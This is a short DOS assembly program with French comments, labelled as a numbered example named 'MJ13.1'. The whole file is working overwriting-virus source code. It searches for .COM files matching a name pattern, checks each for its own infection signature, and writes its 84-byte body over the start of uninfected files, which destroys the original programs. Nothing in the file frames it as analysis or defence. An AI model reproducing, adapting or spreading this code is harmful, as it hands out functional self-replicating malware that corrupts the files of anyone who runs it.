; Recover exemple Nø1
; Nom : MJ13.1 

; **************************************************************************

code            segment
                assume  cs:code,ds:code,es:code,ss:code
                org     100h
main	proc near

START:
MOV AL,0
MOV AH,4Eh
MOV DX,OFFSET COMFILE
INT 21H
JMP INFECTE				; saut sur le proc‚ssus d'infection  

CLOSE:
MOV AH,3EH
INT 21H

PLUS:
MOV AH,4FH
INT 21H
OR AL,AL
JNZ BYE

INFECTE:
MOV AX,3D02H
MOV DX,OFFSET 9EH
INT 21H
MOV BX,AX
MOV AH,3FH
MOV CX,2
MOV DX,OFFSET MTEST
INT 21H
CMP WORD PTR MTEST,00B0H

JZ CLOSE
MOV AX,4200H
MOV CX,00
MOV DX,00
INT 21H

MOV AH,40H
MOV CX,84			; taille du prog
MOV DX,OFFSET START
INT 21H

BYE:  RET

COMFILE:	DB 'coui*.com',0
MTEST:		DW ?

main		endp
code            ends
                end     main